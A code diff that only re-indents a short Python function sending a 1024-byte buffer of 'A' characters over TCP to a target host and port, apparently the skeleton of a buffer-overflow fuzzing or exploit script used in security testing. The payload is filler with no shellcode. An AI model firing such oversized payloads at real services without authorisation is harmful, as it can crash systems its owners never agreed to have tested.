@@ -15,23 +15,23 @@ def send():
     target = str(options.target)
 
     try:
-      print('[+] sending payload')
+        print('[+] sending payload')
 
-      """ assemble temp sc -- """
-      buffer = b"A" * int(1024)
+        """ assemble temp sc -- """
+        buffer = b"A" * int(1024)
 
-      """ send payload -- """
-      s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
-      s.connect(('%s' % target, port))
-      s.send(buffer)
-      s.close()
+        """ send payload -- """
+        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('%s' % target, port))
+        s.send(buffer)
+        s.close()
 
-      print('[+] done')
+        print('[+] done')
 
     except socket.error as e:
-      print('[!] connection failed')
-      print('[!] socket error: %s' % e)
-      sys.exit(-1)
+        print('[!] connection failed')
+        print('[!] socket error: %s' % e)
+        sys.exit(-1)
 
 
 # main --
